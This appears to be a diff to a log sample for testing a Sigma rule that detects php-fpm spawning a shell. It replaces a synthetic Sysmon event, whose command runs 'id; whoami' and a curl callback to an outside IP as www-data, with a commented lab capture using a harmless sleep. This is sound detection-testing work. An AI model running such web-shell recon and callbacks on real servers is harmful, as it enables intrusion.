@@ -1,1 +1,14 @@
-2026-10-20T14:28:04.221119+00:00 websrv01 sysmon: [1] ProcessCreate (rule: ProcessCreate) UtcTime: 2026-10-20 14:28:04.221 ProcessGuid: {5e8f1a20-6c34-4b11-90e6-d701748f0a21} ProcessId: 48213 Image: /bin/dash CommandLine: /bin/sh -c "id; whoami; curl -s http://203.0.113.42:8081/cb" User: www-data IntegrityLevel: - Hashes: SHA256=2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7a ParentProcessGuid: {5e8f1a1f-6c34-4b11-90e6-d701748f0a20} ParentProcessId: 48201 ParentImage: /usr/sbin/php-fpm8.2 ParentCommandLine: php-fpm: pool www ParentUser: www-data TerminalSessionId: 0
+# Real capture, reformatted to Sysmon-for-Linux ProcessCreate field style.
+# Captured via /proc polling (ps --forest + /proc/<pid>/status) against a
+# live WSL2 Ubuntu lab running php-fpm 8.3.6, not an actual Sysmon-for-Linux
+# install -- field names/layout match that schema, but the capture method
+# was manual. PIDs, PPIDs, and the user are real, taken from the live
+# process tree at the moment of capture.
+#
+# This is a DIRECT shell_exec() call in a dedicated test endpoint, not
+# reached via session.upload_progress -- this lab's stall test (see
+# phpup2026-nginx-stall-no-crash.log) confirmed the UAF path does not
+# trigger, so there is no real exploit chain to spawn a shell from. This
+# sample validates the sigma process-spawn rule's field matching against a
+# real php-fpm-parented shell, nothing more.
+2026-10-21T14:53:04.000+00:00 DESKTOP-BVRDK4J sysmon: Process Create: RuleName: - UtcTime: 2026-10-21 14:53:04.000 ProcessGuid: {real-capture-no-guid} ProcessId: 1502326 Image: /bin/dash CommandLine: /bin/sh -c "id; whoami; sleep 1.5" User: www-data IntegrityLevel: - ParentProcessId: 1499529 ParentImage: /usr/sbin/php-fpm8.3 ParentCommandLine: php-fpm: pool www ParentUser: www-data TerminalSessionId: 0
